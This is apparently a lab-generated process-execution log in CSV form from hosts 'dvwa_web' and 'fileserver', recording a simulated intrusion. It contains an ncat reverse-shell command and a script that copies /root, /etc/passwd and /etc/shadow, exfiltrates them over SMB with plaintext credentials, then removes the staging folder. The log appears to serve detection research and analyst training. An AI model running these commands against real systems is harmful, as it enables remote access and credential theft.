@timestamp,agent.hostname,command,cwd,event.ingested,filename,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,sid,tty,uid
"Oct 24, 2022 @ 23:32:09.049",dvwa_web,ncat -e /bin/sh 123.123.123.250 9002,/root,"Oct 24, 2022 @ 23:32:09.999",/usr/bin/ncat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256829 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002,256829,(none),0
"Oct 24, 2022 @ 23:32:09.049",dvwa_web,/usr/sbin/exim4 -Mc 1omzQn-0014oR-Pz,/var/spool/exim4,"Oct 24, 2022 @ 23:32:09.999",/usr/sbin/exim4,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:105 sid:256832 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzQn-0014oR-Pz,256832,(none),105
"Oct 24, 2022 @ 23:31:05.041",dvwa_web,ncat -e /bin/sh 123.123.123.250 9002,/root,"Oct 24, 2022 @ 23:31:06.044",/usr/bin/ncat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256789 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002,256789,(none),0
"Oct 24, 2022 @ 23:31:05.041",dvwa_web,/usr/sbin/exim4 -Mc 1omzPp-0014nn-PE,/var/spool/exim4,"Oct 24, 2022 @ 23:31:06.044",/usr/sbin/exim4,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:105 sid:256792 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzPp-0014nn-PE,256792,(none),105
"Oct 24, 2022 @ 23:30:38.583",fileserver,bash Exfiltration.sh,/,"Oct 24, 2022 @ 23:30:39.584",/bin/bash,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/bin/bash]: bash Exfiltration.sh,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,!/bin/bash,/,"Oct 24, 2022 @ 23:30:39.585",!/bin/bash,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:!/bin/bash]: !/bin/bash,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,mkdir -p /exfil,/,"Oct 24, 2022 @ 23:30:39.585",/bin/mkdir,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/bin/mkdir]: mkdir -p /exfil,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,cp -a /root/. /exfil,/,"Oct 24, 2022 @ 23:30:39.585",/bin/cp,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/bin/cp]: cp -a /root/. /exfil,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,cp /etc/passwd /exfil,/,"Oct 24, 2022 @ 23:30:39.585",/bin/cp,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/bin/cp]: cp /etc/passwd /exfil,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,cp /etc/shadow /exfil,/,"Oct 24, 2022 @ 23:30:39.585",/bin/cp,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/bin/cp]: cp /etc/shadow /exfil,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,smbclient -p 1445 //dvwa_web/exfiltration -U=bob%bob -c prompt OFF; recurse ON; lcd /exfil; mput -r *,/,"Oct 24, 2022 @ 23:30:39.585",/usr/bin/smbclient,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/usr/bin/smbclient]: smbclient -p 1445 //dvwa_web/exfiltration -U=bob%bob -c prompt OFF; recurse ON; lcd /exfil; mput -r *,1,(none),0
"Oct 24, 2022 @ 23:30:38.583",fileserver,rm -rf /exfil,/,"Oct 24, 2022 @ 23:30:39.585",/bin/rm,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/bin/rm]: rm -rf /exfil,1,(none),0
"Oct 24, 2022 @ 23:30:32.582",fileserver,smbclient -p 1445 //dvwa_web/exfiltration -U=bob%bob -c prompt OFF; recurse ON; cd Exfiltration_T1048; mget Exfiltration.sh,/,"Oct 24, 2022 @ 23:30:32.647",/usr/bin/smbclient,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/ filename:/usr/bin/smbclient]: smbclient -p 1445 //dvwa_web/exfiltration -U=bob%bob -c prompt OFF; recurse ON; cd Exfiltration_T1048; mget Exfiltration.sh,1,(none),0
